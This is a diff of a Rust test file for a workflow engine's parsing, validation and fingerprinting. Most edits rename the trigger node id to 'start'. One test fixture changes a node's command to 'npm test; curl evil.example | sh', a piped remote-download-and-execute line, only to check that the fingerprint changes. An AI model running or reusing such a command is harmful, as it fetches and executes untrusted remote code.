@@ -1,5 +1,5 @@
 //! Ports of `workflow.test.ts` and `workflowParse.test.ts`, plus the Rust-specific checks
-//! (JSON shape, order, fingerprint parity with the React code, matchers).
+//! (JSON shape, order, fingerprints pinned to the Rust output, matchers).
 use super::condition::{condition_syntax_problem, eval_condition, parse_condition, Operand};
 use super::fixtures::*;
 use super::model::*;
@@ -81,12 +81,12 @@ fn fingerprint_does_not_change_when_only_board_positions_change() {
 fn fingerprint_changes_when_a_command_changes() {
     let mut w = ticket_workflow();
     w.nodes = vec![
-        node(r#"{"id":"trigger","type":"manual"}"#),
+        node(r#"{"id":"start","type":"manual"}"#),
         node(
             r#"{"id":"build","type":"command","project":"{{inputs.project}}","command":"npm test"}"#,
         ),
     ];
-    w.edges = vec![edge(r#"{"from":"trigger","to":"build"}"#)];
+    w.edges = vec![edge(r#"{"from":"start","to":"build"}"#)];
     let mut edited = w.clone();
     match &mut node_mut(&mut edited, "build").kind {
         NodeKind::Command { command, .. } => *command = "npm test; curl evil.example | sh".into(),
@@ -260,7 +260,7 @@ fn a_run_round_trips_with_string_session_ids() {
         "id": "run-1", "workflowId": "wf-abcd1234",
         "definition": serde_json::from_str::<Value>(EXAMPLE_JSON).unwrap(),
         "status": "doneWithFailures", "startedAt": 5, "endedAt": 9,
-        "caller": {"kind": "mono", "monoId": "m-1", "triggerNode": "trigger", "item": {"ref": "CU-1"}},
+        "caller": {"kind": "mono", "monoId": "m-1", "triggerNode": "start", "item": {"ref": "CU-1"}},
         "folderId": "f1",
         "items": { "each": [{"title": "a"}], "each@r1": [] },
         "nodes": [{
@@ -279,7 +279,7 @@ fn a_run_round_trips_with_string_session_ids() {
         RunCaller {
             kind: CallerKind::Mono,
             mono_id: Some("m-1".into()),
-            trigger_node: "trigger".into(),
+            trigger_node: "start".into(),
             item: Json::parse(r#"{"ref":"CU-1"}"#),
         }
     );
@@ -314,7 +314,7 @@ fn triggers_lists_every_trigger_in_order() {
             .iter()
             .map(|n| n.id.as_str())
             .collect::<Vec<_>>(),
-        ["trigger"]
+        ["start"]
     );
     assert!(Workflow::new("wf-aaaaaaaa", "x").triggers().is_empty());
     assert!(Workflow::new("wf-aaaaaaaa", "x").first_trigger().is_none());
@@ -325,7 +325,7 @@ fn triggers_lists_every_trigger_in_order() {
             .iter()
             .map(|n| n.id.as_str())
             .collect::<Vec<_>>(),
-        ["trigger", "hand"]
+        ["start", "hand"]
     );
 }
 
@@ -498,7 +498,7 @@ fn fills_defaults_for_a_bare_entry() {
 fn needs_review_is_kept_when_true_and_dropped_otherwise() {
     let entry = |extra: &str| {
         format!(
-            r#"[{{"id":"wf-abcd1234","name":"x","nodes":[{{"id":"trigger","type":"manual"}}],"edges":[]{extra}}}]"#
+            r#"[{{"id":"wf-abcd1234","name":"x","nodes":[{{"id":"start","type":"manual"}}],"edges":[]{extra}}}]"#
         )
     };
     assert!(parse_workflows(&entry(r#","needsReview":true"#))[0].needs_review);
@@ -673,8 +673,8 @@ fn a_workflow_may_have_one_to_five_triggers_that_lead_to_the_same_first_step() {
 #[test]
 fn flags_no_trigger() {
     let mut w = example();
-    w.nodes.retain(|n| n.id != "trigger");
-    w.edges.retain(|e| e.from != "trigger");
+    w.nodes.retain(|n| n.id != "start");
+    w.edges.retain(|e| e.from != "start");
     assert!(messages(&w).contains(&"A workflow needs at least one trigger (found 0)".to_string()));
 }
 
@@ -718,7 +718,7 @@ fn flags_a_trigger_that_is_not_connected_when_there_are_several() {
     assert!(flags(&w, "Trigger \"t2\" is not connected"));
     // A lone trigger with nothing after it is a draft, not an error of its own.
     let mut lone = example();
-    lone.nodes.retain(|n| n.id == "trigger");
+    lone.nodes.retain(|n| n.id == "start");
     lone.edges.clear();
     assert_eq!(validate_workflow(&lone), []);
 }
@@ -766,7 +766,7 @@ fn flags_a_loop_edge_that_starts_at_a_node_that_cannot_loop() {
     let mut t = example();
     t.edges.retain(|e| e.loop_spec.is_none());
     t.edges.push(edge(
-        r#"{"from":"trigger","to":"trigger","loop":{"maxRounds":3,"decide":"ai"}}"#,
+        r#"{"from":"start","to":"start","loop":{"maxRounds":3,"decide":"ai"}}"#,
     ));
     assert!(flags(
         &t,
@@ -796,11 +796,11 @@ fn ai_gate(a_model: &str) -> Workflow {
     workflow_from(&format!(
         r#"{{"id":"wf-aaaaaaaa","name":"Gate","inputs":{{"project":{{"type":"project"}}}},
             "inputValues":{{"project":"/x"}},
-            "nodes":[{{"id":"trigger","type":"manual"}},
+            "nodes":[{{"id":"start","type":"manual"}},
               {{"id":"a","type":"session","project":"{{{{inputs.project}}}}","prompt":"a","checkout":"root","output":{{}}{a_model}}},
               {{"id":"b","type":"session","project":"{{{{inputs.project}}}}","prompt":"b","checkout":"root","output":{{}},"model":"claude:opus-5"}},
               {{"id":"gate","type":"if","decide":"ai"}}],
-            "edges":[{{"from":"trigger","to":"a"}},{{"from":"a","to":"b"}},{{"from":"b","to":"gate"}}],
+            "edges":[{{"from":"start","to":"a"}},{{"from":"a","to":"b"}},{{"from":"b","to":"gate"}}],
             "enabled":false,"createdAt":0}}"#
     ))
 }
@@ -838,7 +838,7 @@ fn an_ai_decision_without_a_decision_model_uses_the_nearest_upstream_session() {
     let mut bare = ai_gate("");
     bare.nodes.retain(|n| n.id != "b");
     bare.edges = vec![
-        edge(r#"{"from":"trigger","to":"a"}"#),
+        edge(r#"{"from":"start","to":"a"}"#),
         edge(r#"{"from":"a","to":"gate"}"#),
     ];
     let got = decision_model_for(&bare, "gate").unwrap();
@@ -850,7 +850,7 @@ fn an_ai_decision_without_a_decision_model_uses_the_nearest_upstream_session() {
 fn an_ai_decision_with_neither_a_decision_model_nor_an_upstream_session_fails_validation() {
     let mut w = ai_gate("");
     w.nodes.retain(|n| !matches!(n.id.as_str(), "a" | "b"));
-    w.edges = vec![edge(r#"{"from":"trigger","to":"gate"}"#)];
+    w.edges = vec![edge(r#"{"from":"start","to":"gate"}"#)];
     assert_eq!(decision_model_for(&w, "gate"), None);
     let issues = validate_workflow(&w);
     assert_eq!(
@@ -878,9 +878,9 @@ fn an_ai_decision_with_neither_a_decision_model_nor_an_upstream_session_fails_va
 #[test]
 fn a_switch_and_a_loop_edge_that_decide_with_ai_need_a_model_too() {
     let switch = workflow_from(
-        r#"{"id":"wf-aaaaaaaa","name":"S","nodes":[{"id":"trigger","type":"manual"},
+        r#"{"id":"wf-aaaaaaaa","name":"S","nodes":[{"id":"start","type":"manual"},
             {"id":"route","type":"switch","decide":"ai","cases":["x"]}],
-            "edges":[{"from":"trigger","to":"route"}]}"#,
+            "edges":[{"from":"start","to":"route"}]}"#,
     );
     assert!(flags(
         &switch,
@@ -913,11 +913,11 @@ fn mono_is_read_as_an_alias_of_ai_everywhere_a_decider_is_written() {
     let w = workflow_from(
         r#"{"id":"wf-aaaaaaaa","name":"Alias","inputs":{"project":{"type":"project"}},
             "inputValues":{"project":"/x"},
-            "nodes":[{"id":"trigger","type":"manual"},
+            "nodes":[{"id":"start","type":"manual"},
               {"id":"s","type":"session","project":"{{inputs.project}}","prompt":"p","checkout":"root","output":{}},
               {"id":"gate","type":"if","decide":"mono"},
               {"id":"route","type":"switch","decide":"mono","cases":["a"]}],
-            "edges":[{"from":"trigger","to":"s"},{"from":"s","to":"gate"},{"from":"s","to":"route","handle":null},
+            "edges":[{"from":"start","to":"s"},{"from":"s","to":"gate"},{"from":"s","to":"route","handle":null},
               {"from":"s","to":"s","loop":{"maxRounds":2,"decide":"mono"}}]}"#,
     );
     for id in ["gate", "route"] {
@@ -1068,7 +1068,7 @@ fn accepts_a_summary_reading_a_top_level_session_upstream_through_an_if() {
           "inputs": { "project": { "type": "project" } },
           "inputValues": { "project": "/Users/x/repo" },
           "nodes": [
-            { "id": "trigger", "type": "manual" },
+            { "id": "start", "type": "manual" },
             { "id": "session", "type": "session", "project": "{{inputs.project}}", "checkout": "root",
               "prompt": "Do session", "output": { "weather": { "type": "string" }, "summary": { "type": "string" } } },
             { "id": "gate", "type": "if", "condition": "{{session.weather}} == \"rain\"" },
@@ -1078,7 +1078,7 @@ fn accepts_a_summary_reading_a_top_level_session_upstream_through_an_if() {
               "prompt": "Do session_3", "output": {} }
           ],
           "edges": [
-            { "from": "trigger", "to": "session" },
+            { "from": "start", "to": "session" },
             { "from": "session", "to": "gate" },
             { "from": "gate", "to": "session_2", "handle": "true" },
             { "from": "gate", "to": "session_3", "handle": "false" }
@@ -1403,7 +1403,7 @@ fn rejects_node_ids_that_would_shadow_template_variables() {
 fn flags_an_invalid_schedule() {
     let w = patch_node(
         &example(),
-        "trigger",
+        "start",
         r#"{"schedule":{"scheduleKind":"monthly","time":"9am","minute":0,"dayOfWeek":1}}"#,
     );
     assert!(flags(&w, "schedule"));
@@ -1416,7 +1416,7 @@ fn flags_an_invalid_schedule() {
 #[test]
 fn schedule_errors_match_the_habit_schedule_messages() {
     let schedule = |body: &str| {
-        let w = patch_node(&example(), "trigger", &format!(r#"{{"schedule":{body}}}"#));
+        let w = patch_node(&example(), "start", &format!(r#"{{"schedule":{body}}}"#));
         messages(&w)
     };
     assert_eq!(
@@ -1464,7 +1464,7 @@ fn schedule_errors_match_the_habit_schedule_messages() {
 fn accepts_an_interval_schedule() {
     let w = patch_node(
         &example(),
-        "trigger",
+        "start",
         r#"{"schedule":{"scheduleKind":"interval","time":"00:00","minute":0,"dayOfWeek":1,"intervalHours":6,"intervalFrom":"2026-01-01"}}"#,
     );
     assert_eq!(validate_workflow(&w), vec![]);
@@ -3179,7 +3179,7 @@ fn with_requires(requires: Vec<Requirement>) -> Workflow {
 
 fn requires_json(entries: &str) -> String {
     format!(
-        r#"{{"id":"wf-1","name":"W","requires":{entries},"nodes":[{{"id":"trigger","type":"manual"}}]}}"#
+        r#"{{"id":"wf-1","name":"W","requires":{entries},"nodes":[{{"id":"start","type":"manual"}}]}}"#
     )
 }
 
@@ -3189,7 +3189,7 @@ fn parse_str(text: &str) -> Option<Workflow> {
 
 #[test]
 fn requires_is_empty_when_absent_and_not_written_back() {
-    let w = workflow_from(r#"{"id":"wf-1","name":"W","nodes":[{"id":"trigger","type":"manual"}]}"#);
+    let w = workflow_from(r#"{"id":"wf-1","name":"W","nodes":[{"id":"start","type":"manual"}]}"#);
     assert!(w.requires.is_empty());
     assert!(w.run_values.is_none());
     let written = text(&w);
@@ -3248,7 +3248,7 @@ fn a_bad_requirement_name_is_kept_so_validation_reports_it() {
 #[test]
 fn run_values_are_read_and_kept_apart_from_input_values() {
     let w = parse_str(
-        r#"{"id":"wf-1","name":"W","inputs":{"a":{"type":"string"}},"inputValues":{"a":"x"},"runValues":{"a":"y","n":2},"nodes":[{"id":"trigger","type":"manual"}]}"#,
+        r#"{"id":"wf-1","name":"W","inputs":{"a":{"type":"string"}},"inputValues":{"a":"x"},"runValues":{"a":"y","n":2},"nodes":[{"id":"start","type":"manual"}]}"#,
     )
     .unwrap();
     let rv = w.run_values.clone().unwrap();
@@ -3392,10 +3392,10 @@ fn requirement_issues_have_no_node_id() {
 #[test]
 fn fingerprint_of_a_workflow_without_requires_is_byte_identical_to_the_old_shape() {
     let mut w = Workflow::new("wf-golden", "Tiny");
-    w.nodes = vec![node(r#"{"id":"trigger","type":"manual"}"#)];
+    w.nodes = vec![node(r#"{"id":"start","type":"manual"}"#)];
     assert_eq!(
         definition_fingerprint(&w),
-        r#"{"description":"","edges":[],"inputs":{},"name":"Tiny","nodes":[{"id":"trigger","type":"manual"}]}"#
+        r#"{"description":"","edges":[],"inputs":{},"name":"Tiny","nodes":[{"id":"start","type":"manual"}]}"#
     );
     let mut with_values = w.clone();
     with_values.run_values = Some(OrderedMap::new());
@@ -3430,7 +3430,7 @@ fn fingerprint_changes_when_a_requirement_or_its_hint_is_added_changed_or_remove
 #[test]
 fn a_stored_run_whose_definition_has_no_requires_decodes_with_an_empty_list() {
     let run: WorkflowRun = serde_json::from_str(
-        r#"{"id":"run-1","workflowId":"wf-1","definition":{"id":"wf-1","name":"W","nodes":[{"id":"trigger","type":"manual"}]},"status":"done","startedAt":1,"caller":{"kind":"manual","triggerNode":"trigger"}}"#,
+        r#"{"id":"run-1","workflowId":"wf-1","definition":{"id":"wf-1","name":"W","nodes":[{"id":"start","type":"manual"}]},"status":"done","startedAt":1,"caller":{"kind":"manual","triggerNode":"start"}}"#,
     )
     .unwrap();
     assert!(run.definition.requires.is_empty());
